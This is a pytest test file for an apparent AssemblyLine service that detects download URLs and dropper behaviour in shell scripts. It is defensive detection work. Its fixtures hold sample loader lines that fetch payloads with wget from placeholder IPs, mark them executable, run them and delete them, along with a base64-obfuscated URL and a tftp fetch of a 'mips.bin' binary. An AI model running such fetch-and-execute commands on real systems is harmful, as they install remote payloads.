"""Service behaviour: sections, heuristics and uri/ emission limits."""

import json
import os
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

os.environ.setdefault("SERVICE_MANIFEST_PATH", str(Path(__file__).resolve().parent.parent / "service_manifest.yml"))

from assemblyline_v4_service.common.task import MaxExtractedExceeded  # noqa: E402

from dropperurls.service import DropperURLs  # noqa: E402

DEFAULTS = {"emit_uris": True, "max_uris": 50, "tag_non_http": True}


class Request(SimpleNamespace):
    def __init__(self, path: Path, params: dict, fail_after: int | None = None) -> None:
        super().__init__(file_path=str(path), result=None, emitted=[], params={**DEFAULTS, **params},
                         fail_after=fail_after)

    def get_param(self, name: str) -> Any:
        return self.params[name]

    def get_uri_metadata(self, url: str) -> dict:
        return {"method": "GET"}

    def add_extracted_uri(self, description: str, url: str, params: Any = None) -> bool:
        if self.fail_after is not None and len(self.emitted) >= self.fail_after:
            raise MaxExtractedExceeded("limit")
        self.emitted.append((url, params))
        return True


def run(tmp_path: Path, script: bytes, config: dict | None = None, fail_after: int | None = None, **params: Any):
    path = tmp_path / "script.sh"
    path.write_bytes(script)
    service = DropperURLs(config or {})
    service.start()
    request = Request(path, params, fail_after)
    service.execute(request)  # type: ignore[arg-type]
    return request


def script_with(n: int) -> bytes:
    return "".join(f"wget http://198.51.100.{i}/p{i}\n" for i in range(1, n + 1)).encode()


def sections(request: Request) -> list:
    """Every section, the table first and its subsections after it."""
    out = []
    for section in request.result.sections:
        out.append(section)
        out.extend(section.subsections)
    return out


def titles(request: Request) -> list[str]:
    return [s.title_text for s in sections(request)]


def statuses(request: Request) -> dict[str, str]:
    return {r["URL"]: r["Status"] for r in json.loads(request.result.sections[0].body)}


def heuristic_ids(request: Request) -> list[int]:
    return sorted(s.heuristic.heur_id for s in sections(request) if s.heuristic)


def test_benign_script_gives_an_empty_result(tmp_path):
    request = run(tmp_path, b"#!/bin/sh\necho hello\n")
    assert request.result.sections == [] and request.emitted == []


def test_loader_raises_all_four_heuristics_and_emits_uris(tmp_path):
    script = (b"wget http://198.51.100.7/a; wget http://198.51.100.7/b; wget http://198.51.100.7/c; "
              b"chmod 777 a; ./a; rm -rf a\n")
    request = run(tmp_path, script)
    assert heuristic_ids(request) == [1, 2, 3, 4]
    chain = next(s for s in sections(request) if s.heuristic and s.heuristic.heur_id == 3)
    assert set(chain.heuristic.signatures) == {"chmod_777", "exec_downloaded", "self_delete"}
    assert [u for u, _ in request.emitted] == ["http://198.51.100.7/a", "http://198.51.100.7/b", "http://198.51.100.7/c"]
    assert request.emitted[0][1] == {"method": "GET"}  # stored URI metadata travels with the uri/ file


def test_each_url_is_listed_once(tmp_path):
    script = (b"wget http://198.51.100.7/a; wget http://198.51.100.7/b; wget http://198.51.100.7/c\n"
              b"wget $(echo aHR0cDovLzE5OC41MS4xMDAuNC9iLnNo | base64 -d)\n")
    request = run(tmp_path, script)
    assert len(request.result.sections) == 1  # one table; heuristic sections are its subsections
    for section in sections(request)[1:]:
        assert "http://" not in section.body  # URLs live only in the table


def test_emission_respects_max_uris_and_reports_the_rest(tmp_path):
    request = run(tmp_path, script_with(5), max_uris=2)
    assert len(request.emitted) == 2
    status = statuses(request)
    assert status["http://198.51.100.1/p1"] == "emitted for download"
    assert status["http://198.51.100.5/p5"] == "not emitted: limit (max_uris=2)"


def test_max_uris_is_capped_by_the_service_limit(tmp_path):
    request = run(tmp_path, script_with(5), config={"max_uris_limit": 3}, max_uris=50)
    assert len(request.emitted) == 3


def test_negative_max_uris_emits_nothing(tmp_path):
    request = run(tmp_path, script_with(2), max_uris=-1)
    assert request.emitted == []
    assert set(statuses(request).values()) == {"not emitted: limit (max_uris=0)"}


def test_extracted_file_limit_reports_every_url_not_emitted(tmp_path):
    # AssemblyLine refuses the third uri/ file: URLs 3 and 4 (inside max_uris) and 5 (beyond it)
    # must all be reported as not emitted.
    request = run(tmp_path, script_with(5), fail_after=2, max_uris=4)
    assert len(request.emitted) == 2
    status = statuses(request)
    assert status["http://198.51.100.3/p3"] == "not emitted: AssemblyLine extracted-file limit"
    for i in (4, 5):
        assert status[f"http://198.51.100.{i}/p{i}"].startswith("not emitted")


def test_emit_uris_off_still_reports_findings(tmp_path):
    request = run(tmp_path, script_with(1), emit_uris=False)
    assert request.emitted == []
    assert titles(request) == ["Download commands (1 URL(s))", "Payload fetched from bare IP address"]
    assert statuses(request) == {"http://198.51.100.1/p1": "not emitted: emit_uris is off"}


@pytest.mark.parametrize("tag_non_http,expected", [(True, True), (False, False)])
def test_non_http_urls_are_tagged_only_when_asked(tmp_path, tag_non_http, expected):
    request = run(tmp_path, b"tftp -g -r mips.bin 192.0.2.5\n", tag_non_http=tag_non_http)
    uris = request.result.sections[0].tags.get("network.static.uri", [])
    assert ("tftp://192.0.2.5/mips.bin" in uris) is expected
    assert statuses(request) == {"tftp://192.0.2.5/mips.bin": "not emitted: URLDownloader fetches only HTTP(S)"}
    assert request.emitted == []


def test_how_found_and_status_columns(tmp_path):
    script = b'CB=http://198.51.100.70\nwget "$CB/a"\nwget http://198.51.100.71/$(uname -m)\n'
    request = run(tmp_path, script)
    rows = {r["URL"]: (r["How found"], r["Status"]) for r in json.loads(request.result.sections[0].body)}
    assert rows == {"http://198.51.100.70/a": ("variable", "emitted for download"),
                    "http://198.51.100.71/$(uname": ("literal", "not emitted: unresolved")}
    assert [u for u, _ in request.emitted] == ["http://198.51.100.70/a"]


def test_encoded_urls_raise_heuristic_5_and_plain_ones_do_not(tmp_path):
    assert 5 in heuristic_ids(run(tmp_path, b"wget $(echo aHR0cDovLzE5OC41MS4xMDAuNC9iLnNo | base64 -d)\n"))
    assert 5 not in heuristic_ids(run(tmp_path, b"wget http://198.51.100.4/b.sh\n"))
